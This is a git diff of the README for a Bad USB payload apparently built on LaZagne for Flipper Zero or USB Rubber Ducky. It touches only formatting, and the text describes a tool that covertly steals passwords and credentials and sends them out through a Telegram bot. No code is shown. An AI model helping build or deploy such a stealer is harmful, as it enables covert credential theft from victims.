@@ -19,11 +19,12 @@
 
 # Lazagne 🛡
 
-Lazagne on Flipper Zero or USB Rubber Ducky: Your all-in-one infiltrator. This Bad USB payload turns your Flipper or USB Rubber Ducky into a digital spy, grabbing passwords and credentials from vulnerable systems.
+<b>Lazagne on Flipper Zero or USB Rubber Ducky: Your all-in-one infiltrator. This Bad USB payload turns your Flipper or USB Rubber Ducky into a digital spy, grabbing passwords and credentials from vulnerable systems.</b>
 
 ## Description
+> [!NOTE]\
+> <b>You will need [telegram bot](https://telegram.me/BotFather) for this script, so you will have to change $bt & $ci!</b>
 
-### REMINDER ⚠ You will need telegram bot for this script, so you will have to change $bt & $ci!
 When activated on Flipper Zero or USB Rubber Ducky, it stealthily infiltrates target systems, exploiting vulnerabilities to snatch sensitive data such as passwords and credentials. Essentially, it's a digital pickpocket, quietly making off with valuable information without leaving a trace.
 
 ---------------------------------------------------------------------------------------------------------------------------------------------------------
